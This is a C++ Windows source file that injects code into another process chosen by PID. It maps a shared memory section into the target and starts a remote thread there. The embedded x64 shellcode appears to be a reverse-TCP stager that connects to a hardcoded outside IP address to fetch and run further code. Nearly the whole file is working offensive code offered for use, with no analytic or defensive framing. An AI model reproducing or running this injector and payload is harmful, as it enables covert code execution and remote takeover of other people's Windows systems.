
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <winternl.h>


typedef NTSTATUS(NTAPI* pNtCreateSection)(
	OUT PHANDLE SectionHandle, 
	IN ULONG DesiredAccess, 
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, 
	IN PLARGE_INTEGER MaximumSize OPTIONAL, 
	IN ULONG PageAttributess, 
	IN ULONG SectionAttributes, 
	IN HANDLE FileHandle OPTIONAL
	);
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT CLIENT_ID *ClientID
	);

unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
"\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48"
"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48"
"\x18\x44\x8b\x40\x20\x50\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1"
"\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
"\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
"\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
"\x49\xbc\x02\x00\x0d\x05\x2f\x5f\xdb\x60\x41\x54\x49\x89\xe4"
"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
"\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
"\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5"
"\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
"\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"
"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40"
"\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";


BOOL section_inject(DWORD pid) 
{
	NTSTATUS status;
	HMODULE hNtdll;
	pNtCreateSection NtCreateSection;
	pNtMapViewOfSection NtMapViewOfSection;
	pRtlCreateUserThread RtlCreateUserThread;
	hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL) {
		printf("[-]LoadLibrary Failed\n");
		exit(1);
	}
	NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
	// Create Section in Current Process Virtual Memory
	HANDLE hSection = NULL;
	SIZE_T size = sizeof(shellcode);
	LARGE_INTEGER sectionSize = { size };
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;
	HANDLE hProcess = NULL;
	HANDLE tgtThreadHandle = NULL;
	// RWX
	status = NtCreateSection(
		&hSection,
		SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
		NULL,
		(PLARGE_INTEGER)&sectionSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	);
	if (NT_ERROR(status)) {
		printf("[-]NtCreateSection Failed, Error Code:%d\n", status);
		goto clean;
	}
	// try to MapViewOfSection
	status = NtMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&localSectionAddress,
		NULL,
		NULL,
		NULL,
		&size,
		2,
		NULL,
		PAGE_READWRITE
	);
	if (NT_ERROR(status)) {
		printf("[-]NtMapViewOfSection Failed, Error Code:%d\n", status);
		goto clean;
	}
	// try to create a view of the memory section in the target process
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		false,
		pid
	);
	if (hProcess == NULL)
	{
		printf("[-]OpenProcess Failed\n");
		goto clean;
	}
	status = NtMapViewOfSection(
		hSection,
		hProcess,
		&remoteSectionAddress,
		NULL,
		NULL,
		NULL,
		&size,
		2,
		NULL,
		PAGE_EXECUTE_READ
	);
	if (NT_ERROR(status)) {
		printf("[-]NtMapViewOfSection Failed, Error Code:%d\n", status);
		goto clean;
	}
	// try to copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, shellcode,sizeof(shellcode));
	
	// RtlCreateUserThread to run shellcode in target process
	status = RtlCreateUserThread(
		hProcess,
		NULL,
		FALSE,
		0,
		0,
		0,
		remoteSectionAddress,
		NULL,
		&tgtThreadHandle,
		NULL
	);

	if (NT_ERROR(status)) {
		printf("[-]RtlCreateUserThread Failed, Error Code:%d\n", status);
		goto clean;
	}
	return TRUE;

clean:
	if (tgtThreadHandle)
	{
		CloseHandle(tgtThreadHandle);
	}
	if(hProcess)
	{
		CloseHandle(hProcess);
	}
	if (hSection) 
	{
		CloseHandle(hSection);
	}
	if (localSectionAddress) 
	{
		CloseHandle(localSectionAddress);
	}
	if (remoteSectionAddress)
	{
		CloseHandle(remoteSectionAddress);
	}
	return FALSE;
}



int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("[*]Usage: %s <pid>", argv[0]);
	}
	DWORD pid = (DWORD)atoi(argv[1]);
	if (section_inject(pid))
	{
		printf("[+]section_inject Success\n");
	}
	else
	{
		printf("[-]section_inject Failed\n");
	}
	return 0;
}

